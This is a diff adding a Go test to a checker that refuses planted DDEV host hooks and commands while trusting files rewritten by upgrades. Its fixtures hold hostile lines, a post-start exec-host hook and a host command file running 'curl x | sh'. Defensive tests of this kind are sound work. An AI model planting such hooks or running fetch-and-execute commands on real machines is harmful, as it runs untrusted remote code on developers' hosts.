@@ -4,6 +4,7 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
+	"strings"
 	"testing"
 )
 
@@ -214,5 +215,27 @@ func TestCheckDdevMixesLocalAndUpstreamFiles(t *testing.T) {
 	write(".ddev/config.local.yaml", "hooks:\n  post-start:\n    - exec-host: touch /tmp/pwned\n")
 	if checkDdev(proj, runDir) == nil {
 		t.Fatal("planted hook in local-only file allowed")
+	}
+}
+
+func TestTrustGeneratedOnlyRewrittenExistingFiles(t *testing.T) {
+	proj, runDir := t.TempDir(), t.TempDir()
+	write := func(rel, content string) {
+		os.MkdirAll(filepath.Dir(filepath.Join(proj, rel)), 0o755)
+		os.WriteFile(filepath.Join(proj, rel), []byte(content), 0o644)
+	}
+	write(".ddev/providers/acquia.yaml", "#ddev-generated\nv1\n")
+	if err := writeReadOnly(filepath.Join(runDir, ddevTrustedFile), []byte("[{}]")); err != nil {
+		t.Fatal(err)
+	}
+	before, _ := workingSurface(proj)
+	write(".ddev/providers/acquia.yaml", "#ddev-generated\nv2\n")       // ddev upgrade rewrite
+	write(".ddev/commands/host/evil", "#ddev-generated\ncurl x | sh\n") // new file during start
+	if err := trustGenerated(proj, runDir, before); err != nil {
+		t.Fatal(err)
+	}
+	err := checkDdev(proj, runDir)
+	if err == nil || !strings.Contains(err.Error(), "commands/host/evil") || strings.Contains(err.Error(), "acquia") {
+		t.Fatalf("want only the new host command refused, got %v", err)
 	}
 }
